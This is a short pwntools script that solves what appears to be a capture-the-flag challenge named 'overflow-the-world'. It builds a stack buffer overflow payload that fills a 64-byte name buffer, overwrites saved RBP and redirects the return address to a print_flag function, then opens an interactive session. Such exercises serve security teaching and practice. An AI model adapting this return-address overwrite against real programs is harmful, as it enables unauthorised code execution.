from pwn import *

exe = ELF("./overflow-the-world")

r = process([exe.path])
# gdb.attach(r)

win = exe.symbols["print_flag"]

# Payload construction:
# 1. Fill the 64-byte name buffer
# 2. Overwrite saved RBP (8 bytes)
# 3. Overwrite return address with print_flag address (8 bytes)

payload = b'A' * 64      # Fill the name[64] buffer
payload += b'B' * 8      # Overwrite saved RBP
payload += p64(win)      # Overwrite return address with print_flag

r.recvuntil(b"What's your name? ")
r.sendline(payload)

r.recvuntil(b"Let's play a game.\n")
r.interactive()